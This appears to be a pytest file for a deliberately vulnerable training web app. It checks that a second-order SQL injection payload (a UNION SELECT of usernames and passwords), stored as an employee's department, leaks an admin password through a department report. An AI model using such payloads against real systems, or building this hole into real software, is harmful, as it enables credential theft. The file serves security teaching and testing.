from app.core.seed import seed_database


SECOND_ORDER_PAYLOAD = "NoSuchDept' UNION SELECT username, password, 0 FROM injection_accounts--"


def test_add_employee_stores_payload_safely(app, client):
    seed_database(app)
    response = client.post(
        "/a03/roster/add-employee",
        data={
            "name": "Mallory",
            "email": "mallory@example.com",
            "department": SECOND_ORDER_PAYLOAD,
            "salary": "1",
        },
    )
    assert response.status_code == 302


def test_department_report_leaks_credentials_via_second_order_injection(app, client):
    seed_database(app)
    client.post(
        "/a03/roster/add-employee",
        data={
            "name": "Mallory",
            "email": "mallory@example.com",
            "department": SECOND_ORDER_PAYLOAD,
            "salary": "1",
        },
    )
    response = client.get("/a03/roster/department-report")
    assert response.status_code == 200
    assert b"sup3r-s3cret-admin-pw" in response.data


def test_department_report_shows_normal_departments_unaffected(app, client):
    seed_database(app)
    response = client.get("/a03/roster/department-report")
    assert response.status_code == 200
    assert b"Engineering" in response.data
    assert b"Alice Chen" in response.data
